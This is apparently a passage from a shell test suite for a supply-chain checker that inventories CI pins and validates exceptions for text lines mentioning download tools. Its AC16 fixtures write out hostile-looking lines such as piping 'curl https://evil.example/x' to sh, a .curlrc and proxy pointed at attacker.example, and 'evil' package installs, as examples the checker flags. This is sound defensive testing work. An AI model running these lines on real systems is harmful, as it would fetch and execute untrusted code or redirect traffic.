spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("pip" + " -a" * 1000 + " x", "docker" + " -a" * 1000 + " x", "python3 -m pip" + " -q" * 1000 + " install evilpkg==9.9.9"):
    inv.inventory({"bin/x.sh": body + "\n"})
assert time.time() - t < 2, time.time() - t
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker --context x run evil/x:latest\n"})
PY

CASE="a hostile many-line file or a step that repeats one command hundreds of times is refused quickly (items and lines are bounded), and compound commands (cd x&&pip install y; a;pip install b) are read as separate commands"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for files in ({"bin/x.sh": ("pip install " * 320 + "\n") * 100},
              {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n" + "".join("          " + "pip install " * 320 + "\n" for _ in range(100))},
              {"bin/y.sh": "echo\n" * 30000}):
    try:
        inv.inventory(files)
    except RuntimeError:
        pass
    else:
        raise AssertionError("a hostile file was read")
assert time.time() - t < 5, time.time() - t
got = inv.inventory({"bin/x.sh": "cd x&&pip install foo==1.0\necho hi;pip install bar==2.0\n"})
assert "package:pypi/foo@1.0" in got and "package:pypi/bar@2.0" in got
PY

CASE="removing an installer action's version input leaves a (default) placeholder (refused), and a release asset that is missing borrows no other asset's age"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, sys, subprocess, os, json
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mk = lambda w: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + w}
with_v = inv.inventory(mk("        with:\n          version: v2.13.2\n")); without = inv.inventory(mk(""))
assert [k for k in without if k not in with_v and "(default)" in k], sorted(without)
assert not [k for k in with_v if "(default)" in k]
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
ac._release_with_assets = lambda repo, tags: {"published_at": "2026-01-01T00:00:00Z", "assets": [{"name": "other.tgz", "created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-01-01T00:00:00Z"}]}
ac._pr_clock = lambda *a, **k: None
it = inv.Item("tool", "o/r", "v1.0", "v1.0", "wanted.tgz")
assert ac.live_proofs(it, ".") == [], "a missing asset must not borrow another asset's age"
PY

CASE="phase 2 R2 fixes: version FILES are items (their content is the key), a called workflow's input defaults and a local call's with: change the identity, a changed checksum on a download's step moves it, pip global options with values do not hide install, a second (default) step is its own key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert set(inv.inventory({".python-version": "3.12\n"})) != set(inv.inventory({".python-version": "3.99.9\n"}))
callee = lambda v: {".github/workflows/callee.yml": "on:\n  workflow_call:\n    inputs:\n      lint-version:\n        default: " + v + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ inputs.lint-version }}\n"}
assert set(inv.inventory(callee("v2.13.2"))) != set(inv.inventory(callee("v9.99.9")))
caller = lambda v: {".github/workflows/caller.yml": "jobs:\n  c:\n    uses: ./.github/workflows/callee.yml\n    with:\n      lint-version: " + v + "\n"}
assert set(inv.inventory(caller("v2.13.2"))) != set(inv.inventory(caller("v9.99.9")))
dl = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n          echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(dl("a" * 64))) != set(inv.inventory(dl("b" * 64)))
assert inv.inventory({"bin/x.sh": "pip --timeout 60 install evil==9.9.9\n"}).get("package:pypi/evil@9.9.9")
d2 = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - name: one\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - name: two\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n"})
assert len([k for k in d2 if "(default)" in k]) == 2
PY

CASE="bumping an action whose step also carries a placeholder (a checkout with fetch-tags: true, a (default) installer input) moves ONLY the action: the placeholder's identity does not contain the pin, and a boolean input is not an installer input"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
co = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/checkout@" + sha + " # v7\n        with:\n          fetch-tags: true\n"}
a, b = inv.inventory(co("a" * 40)), inv.inventory(co("b" * 40))
assert [k for k in b if k not in a] == ["action:actions/checkout@" + "b" * 40], [k for k in b if k not in a]
assert not [k for k in a if "(input)" in k]
lint = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + sha + " # v9\n"}
assert [k for k in inv.inventory(lint("b" * 40)) if k not in inv.inventory(lint("a" * 40))] == ["action:golangci/golangci-lint-action@" + "b" * 40]
PY

CASE="phase 2 R3 fixes: --isolated is a flag (install is not its value), a version file at any path is an item, two identical unresolved installer steps are two items, a checksum in ANY step of the job moves a download, a python/java/node SERIES (3.12, 21) is not an exact pin"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert inv.inventory({"bin/x.sh": "python3 -m pip --isolated install black==99.0.0\n"}).get("package:pypi/black@99.0.0")
assert set(inv.inventory({"config/.python-version": "3.12.1\n"})) != set(inv.inventory({"config/.python-version": "3.99.9\n"}))
two = lambda second: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + second}
assert len([k for k in inv.inventory(two("")) if "(default)" in k]) == 2
sep = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n      - run: echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(sep("a" * 64))) != set(inv.inventory(sep("b" * 64)))
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
import datetime as dt
now = dt.datetime(2026, 10, 6, tzinfo=dt.timezone.utc)
for name, ver in (("python", "3.12"), ("java", "21"), ("node", "22")):
    assert not ac.judge_item(inv.Item("tool", name, ver), [("2026-09-01T00:00:00Z", "github-release")], now)[0], name
assert ac.judge_item(inv.Item("tool", "python", "3.12.4"), [("2026-09-01T00:00:00Z", "github-release")], now)[0]
PY

CASE="phase 2 R5 fixes: repeated expression-valued installer steps are numbered, a checksum FILE's content moves a download, an env source key bound to an expression never prints its name"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
two = lambda v2: {".github/workflows/a.yml": "env:\n  LINT_V: v2.14.0\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ env.LINT_V }}\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + v2 + "\n"}
assert set(inv.inventory(two("v2.13.2"))) != set(inv.inventory(two("${{ env.LINT_V }}")))
assert len([k for k in inv.inventory(two("${{ env.LINT_V }}")) if "expression" in k]) == 2
cs = lambda c: {".github/policy/gh-checksums.txt": c * 64 + "  gh.tar.gz\n"}
assert set(inv.inventory(cs("a"))) != set(inv.inventory(cs("b")))
src = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    env:\n      PRIVATE_DOWNLOAD_URL: ${{ secrets.PRIVATE_DOWNLOAD_URL }}\n    steps:\n      - run: echo hi\n"})
assert not any("private_download_url" in k.lower() for k in src), sorted(src)
PY

CASE="an image named localhost/... (no port) used by docker run/create with --pull=never is local to the job and is NOT an item (advisor 0203); a pull, a run without --pull=never, a container: or services: image, localhost:PORT/, localhostx/ and a mid-name localhost/ all stay items (a registry can answer for localhost; Codex #187)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
step = lambda cmd: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + cmd + "\n"}
imgs = lambda files: [k for k in inv.inventory(files) if k.startswith("image:")]
D = "@sha256:" + "a" * 64
assert not imgs(step("docker run --pull=never --rm localhost/fa-production true")), "run --pull=never of a localhost/ image is local"
assert not imgs(step("docker create --pull never localhost/fa-debug:latest")), "create --pull never too"
assert imgs(step("docker run --rm localhost/fa-production true")), "a run without --pull=never may pull"
assert imgs(step("docker pull localhost/x" + D)), "a pull downloads from a registry named localhost"
assert imgs(step("docker run --pull=always localhost/x" + D)), "--pull=always downloads"
assert imgs(step("docker run --pull=never localhost:5000/fa-production:1 true")), "localhost:PORT is a registry"
assert imgs(step("docker run --pull=never localhostx/fa-production:1 true")), "a name that only starts with localhost is not local"
assert imgs(step("docker run --pull=never registry.example/localhost/fa:1 true")), "localhost/ in the middle of a name is not local"
assert imgs(step("docker run --pull=never --pull=always localhost/x" + D + " true")), "the LAST --pull wins: always downloads"
assert not imgs(step("docker run --pull=always --pull=never localhost/fa-x true")), "the last --pull is never: local"
assert imgs(step("docker run --pull=never --pull=always localhost/fa-x true")), "the last --pull is always: a tag-only localhost/ image is an item"
assert not imgs(step("podman run --pull never localhost/fa-x true")), "podman and a separate value too"
assert imgs(step("docker pull --pull=never localhost/fa-x")), "docker pull is never exempt (tag-only form: no digest scan to mask a mistake)"
assert imgs(step("docker run localhost/x" + D + " --pull=never")), "a --pull after the image operand is the container's argument, not a policy"
assert imgs(step("docker run --label x --pull always localhost/x" + D + " true")), "--pull always as a separate value downloads"
assert imgs(step("docker pull --pull=never localhost/x" + D)), "docker pull never exempts"
assert imgs(step("docker run --label=--pull=never localhost/x" + D + " true")), "a quoted/attached option VALUE that spells --pull=never is not a policy"
# tag-only forms (no digest scan to mask a mistake): one parser for the policy and the image (Codex #187 round 3)
assert imgs(step("docker run --pull=never --cpu-period 100000 --pull=always localhost/fa-x true")), "a numeric option value before the last --pull"
assert imgs(step("docker run --pull=never --label \"description=hello world\" --pull=always localhost/fa-x true")), "a quoted option value with a space before the last --pull"
assert not imgs(step("docker run --cpu-period 100000 --pull=never localhost/fa-x true")), "a numeric option value before --pull=never stays local"
assert not imgs(step("docker run --label \"description=hello world\" --pull=never localhost/fa-x true")), "a quoted value before --pull=never stays local"
assert imgs(step("docker run localhost/fa-x --pull=never")), "a --pull after the image operand is the container's argument (tag-only)"
assert imgs(step("docker run --name --pull=never localhost/fa-x true")), "an option's value that spells --pull=never is not a policy (tag-only)"
assert imgs(step("docker run --pull=always --rm 123 --pull=never localhost/fa-x")), "a boolean flag does not take the next word: 123 is the operand, the rest are container arguments (Codex #187 round 4)"
assert imgs(step("docker run --frobnicate 5 --pull=never localhost/fa-x true")), "an option of unknown arity withholds the exemption"
assert not imgs(step("docker run -d --rm --init --pull=never localhost/fa-x true")), "known booleans and a known cluster stay local"
assert not imgs(step("docker run -dit --pull=never localhost/fa-x true")), "a short cluster of booleans is known"
assert not imgs(step("docker run --memory=512m --pull=never localhost/fa-x true")), "--name=value of a known value option is known"
sh = {"bin/check.sh": "docker run --pull=never --label \"a b\" --pull=always localhost/fa-x" + D + " true\n"}
assert imgs(sh), "the same in a script"
assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "an option's value that spells --pull=never is not a policy"
cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
PY

# --- REQ-SUP-001-AC16: ruled text lines. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's
# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 64-hex hash of the downloader segment), line (the 64-hex hash of the
# WHOLE flattened line the segment sits in), ruling[, count]}. A matching row reports the item
# as ruled text; no row, a wrong hash (an edited line), a row on the pull request's side only, or more occurrences than the row counts fail as before;
# a malformed list stops the check (exit 2), never "nothing exempted" and never "everything exempted". -------------------------------------------------------
rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
pyw() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }   # python that writes FILE with TEXT
newcase rt "$(pyw bin/ruled.sh "$rtext")"
# rtrows REPO OUT MODE: writes an exceptions file whose unmeasured_text rows are built from the REAL scan of REPO (HEAD~1..HEAD), changed by MODE
rtrows() {
  python3 - "$chk" "$1" "$2" "$3" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
repo, out, mode = sys.argv[2:5]
added = ac._added_unmeasured(repo, "HEAD~1", "HEAD")
import hashlib, re, subprocess
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
def lines_for(f, kh):   # an independent oracle: the whole flattened lines (as the scan flattens them) that hold a segment, or are a line, hashing to kh
    text = subprocess.run(["git", "-C", repo, "show", "HEAD:" + f], capture_output=True, text=True, check=True).stdout
    out = []
    for line in re.sub(r"\\\n\s*", " ", text).split("\n"):
        flat = " ".join(line.split())
        if flat and (H(flat) == kh or any(H(s) == kh for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat))) and H(flat) not in out:
            out.append(H(flat))
    return out
rows = [{"file": f, "form": w, "key": k.split(":", 1)[0], "line": lh, "ruling": "text, not a command: a test line"} for f, w, k in added for lh in lines_for(f, k.split(":", 1)[0])]
assert len(rows) >= len(added), (rows, added)
raw = None
d = {"_format": "t", "exceptions": []}
if mode == "all": pass
elif mode == "first": rows = rows[:1]
elif mode == "none": rows = []
elif mode == "wronghash": rows[0]["key"] = ("0" if rows[0]["key"][0] != "0" else "1") + rows[0]["key"][1:]
elif mode == "wrongfile": rows = [dict(r, file="bin/other.sh") for r in rows]
elif mode == "wrongform": rows = [dict(r, form="a system package install") for r in rows]
elif mode == "emptyruling": rows[0]["ruling"] = ""
elif mode == "spaceruling": rows[0]["ruling"] = " \t "
elif mode == "noruling": del rows[0]["ruling"]
elif mode == "nokey": del rows[0]["key"]
elif mode == "intkey": rows[0]["key"] = 12345
elif mode == "shortkey": rows[0]["key"] = rows[0]["key"][:12]
elif mode == "fullkey": rows[0]["key"] = added[0][2]
elif mode == "upperkey": rows[0]["key"] = rows[0]["key"].upper()
elif mode == "dup": rows = rows + rows[:1]
elif mode == "extra": rows[0]["note"] = "x"
elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["form"], rows[0]["key"], rows[0]["line"], rows[0]["ruling"]]
elif mode == "noline": del rows[0]["line"]
elif mode == "intline": rows[0]["line"] = 7
elif mode == "shortline": rows[0]["line"] = rows[0]["line"][:15]
elif mode == "upperline": rows[0]["line"] = rows[0]["line"].upper()
elif mode == "wrongline": rows[0]["line"] = ("0" if rows[0]["line"][0] != "0" else "1") + rows[0]["line"][1:]
elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "ruling": "text, not a command: another ruling"}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
elif mode == "count0": rows[0]["count"] = 0
elif mode == "countbool": rows[0]["count"] = True
elif mode == "countstr": rows[0]["count"] = "2"
elif mode == "count1": rows = [dict(r, count=1) for r in rows]
elif mode == "count2": rows = [dict(r, count=2) for r in rows]
elif mode == "count100": rows = [dict(r, count=100) for r in rows]
elif mode == "count101": rows[0]["count"] = 101
elif mode == "countfloat": rows[0]["count"] = 2.0
elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
elif mode == "notlist": rows = {"rows": rows}
elif mode == "emptyfile": rows[0]["file"] = ""
else: raise SystemExit("unknown mode " + mode)
d["unmeasured_text"] = rows
if raw is not None:
    open(out, "w").write(raw)
else:
    json.dump(d, open(out, "w"), indent=2)
PY
}
rtck() { # REPO MODE [extra args] -> rc, $work/rt.out
  local repo=$1 mode=$2; shift 2; rtrows "$work/$repo" "$work/rt-$mode.json" "$mode"; rc=0
  python3 "$chk" --root "$work/$repo" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --json "$work/rt.json" --exceptions "$work/rt-$mode.json" "$@" >"$work/rt.out" 2>&1 || rc=$?
}
CASE="AC16 setup: the fixture adds exactly two unmeasured text lines (a comment and an echo that mention a download tool), the scan stays strict"
check python3 - "$chk" "$work/rt" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
a = ac._added_unmeasured(sys.argv[2], "HEAD~1", "HEAD")
assert len(a) == 2 and all(x[0] == "bin/ruled.sh" and x[1] == "a download" for x in a), a
PY
rtck rt all
CASE="AC16: a base-branch row for each added text line (file, form, line hash, ruling) passes: exit 0, each reported as ruled text with its ruling"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2; check grep -q 'text, not a command: a test line' "$work/rt.out"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1]))['moved']; assert len(r)==2 and all(x['ok'] and 'ruled text' in x['reason'] for x in r), r" "$work/rt.json"
rtck rt first
CASE="AC16: a row exempts exactly its own item: the other added line has no row and fails (exit 1), named as unmeasured, while the ruled one is reported as ruled"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
rtck rt none
CASE="AC16: an empty unmeasured_text list exempts nothing: both added lines fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
rtck rt wronghash
CASE="AC16: a row whose line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
for m in wrongfile wrongform; do rtck rt $m
CASE="AC16: a row with the right hash but the wrong ${m#wrong} does not apply: both items fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2; done
rtck rt wrongline
CASE="AC16: a row whose WHOLE-line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
rtrows "$work/rt" "$work/rt-orig.json" all
newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat nantop infnested neginfrow; do rtck rt $m
CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-badjson.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: an exceptions file that is not JSON stops the check (exit 2), never 'nothing ruled'"
check test "$rc" -eq 2
rc=0; python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/does-not-exist.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: an --exceptions path that does not exist stops the check (exit 2)"
check test "$rc" -eq 2
echo '{"exceptions": []}' >"$work/rt-nolist.json"; rc=0
python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-nolist.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: a file with no unmeasured_text list rules nothing: the added lines fail as before (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
# the same line twice: a row covers ONE occurrence unless it says count
newcase rt2 "$(pyw bin/ruled.sh "$rtext${rtext#*$'\n'}")"
rtck rt2 all
CASE="AC16: the same text lines added TWICE need rows that count both: a row without count covers one occurrence, so the items fail (exit 1)"
check test "$rc" -eq 1
rtck rt2 count1
CASE="AC16: count 1 on lines added twice fails too (exit 1)"
check test "$rc" -eq 1
rtck rt2 count2
CASE="AC16: count 2 on lines added twice passes (exit 0)"
check test "$rc" -eq 0
# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
cat >"$work/sx-ruled.txt" <<'EOF'
    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
EOF
cat >"$work/sx-attack.txt" <<'EOF'
echo 'url = https://attacker.example/payload.sh' > ~/.curlrc
export https_proxy=http://attacker.example:3128
echo $'x|\n      curl -s https://evil.example/x |y' | sh
EOF
cat >"$work/sx-other.txt" <<'EOF'
echo 'a|\n      curl -s https://evil.example/x|b' | bash
EOF
newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
rtrows "$work/sx" "$work/rt-sx.json" all
sxck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-sx.json" >"$work/rt.out" 2>&1 || rc=$?; }
sxck sx
CASE="AC16 (whole line): the ruled line itself, with its row (segment hash and whole-line hash), passes (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
newcase sxa "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-attack.txt")")"
sxck sxa
CASE="AC16 (whole line): the Sonnet reproduction (the ruled segment embedded in another line that pipes to sh, next to a .curlrc and a proxy) FAILS (exit 1): not ruled"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/build-helpers-test.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
newcase sxo "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-other.txt")")"
sxck sxo
CASE="AC16 (whole line): the same segment with different surrounding text in another line FAILS (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
newcase sxboth "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt" "$work/sx-attack.txt")")"
sxck sxboth
CASE="AC16 (whole line): the ruled line AND the segment hidden in another line in one file: the item FAILS (exit 1), the ruled line lends nothing"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
for edit in 's/b\.yaml/c.yaml/' 's/same-step/same-stop/' 's/tee -a/tee/' 's/- runs/- run/'; do
  newcase sxe "$(pyw bin/build-helpers-test.sh "$(sed "$edit" "$work/sx-ruled.txt")")"
  sxck sxe
  CASE="AC16 (whole line): editing ANY part of the ruled line, even outside the downloader segment ($edit), voids its row: exit 1"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
done
newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
sxck sxm
CASE="AC16 (whole line): the ruled line moved to another file is not ruled: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/other-test.sh' "$work/rt.out"
rtck rt2 count100
CASE="AC16: count 100 (the cap) is accepted: lines added twice pass (exit 0)"
check test "$rc" -eq 0
# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
twoc() {
  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
import pathlib, subprocess, sys
root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
PY
}
# mkrow OUT FILE LINE [count]: one row for the download segment of LINE (first segment naming curl or wget), bound to LINE, flattened as the scan flattens
mkrow() {
  python3 - "$@" <<'PY'
import hashlib, json, re, sys
out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
row = {"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": "text, not a command: a test line"}
if len(sys.argv) > 4: row["count"] = int(sys.argv[4])
json.dump({"exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
print(row["key"], row["line"])
PY
}
edck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$2" >"$work/rt.out" 2>&1 || rc=$?; }
echo '{"exceptions": [], "unmeasured_text": []}' >"$work/rt-empty.json"
CASE="edited line: Codex's row for bin/ruled.sh has key and line (the scan's hashes of the ruled text)"
check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd7313c1ca7f03fcc156e6e22e874446a26f5f759c5e0a083f 0c81fb09bb82dffd7313c1ca7f03fcc156e6e22e874446a26f5f759c5e0a083f"
twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
edck cx "$work/rt-codex.json"
CASE="edited line (Codex, verbatim): the base has the ruled text, the head pipes the same segment to sh: an ADDITION that no row names: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
edck pre "$work/rt-empty.json"
CASE="edited line (the pre-existing class): a flagged base line rewritten with the same download segment (-o /tmp/a -> | sh) is an addition: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:tools/fetch.sh' "$work/rt.out"
twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
edck keep "$work/rt-empty.json"
CASE="edited line: an untouched flagged base line stays not added (another line of the file changed): exit 0"
check test "$rc" -eq 0
twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
edck ws "$work/rt-empty.json"
CASE="edited line: a whitespace-only edit (spaces and tabs) stays not added, as the scan flattens it: exit 0"
check test "$rc" -eq 0
